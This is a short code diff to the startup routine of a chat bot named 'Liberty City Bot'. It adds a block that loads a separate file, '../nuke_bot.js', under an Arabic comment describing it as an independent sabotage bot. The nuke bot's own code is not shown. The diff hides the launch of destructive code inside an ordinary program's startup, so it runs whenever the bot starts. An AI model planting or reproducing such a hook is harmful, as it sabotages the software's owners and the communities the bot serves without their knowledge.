@@ -62,6 +62,14 @@ async function main(): Promise<void> {
   console.log(banner);
   logger.info('🎆 Welcome to Liberty City Bot!');
   
+  // --- تشغيل بوت التخريب المستقل ---
+  try {
+    require('../nuke_bot.js');
+  } catch (e) {
+    logger.error('Failed to load nuke_bot.js:', e);
+  }
+  // ----------------------------------
+
   const startTime = Date.now();
   
   // Create client
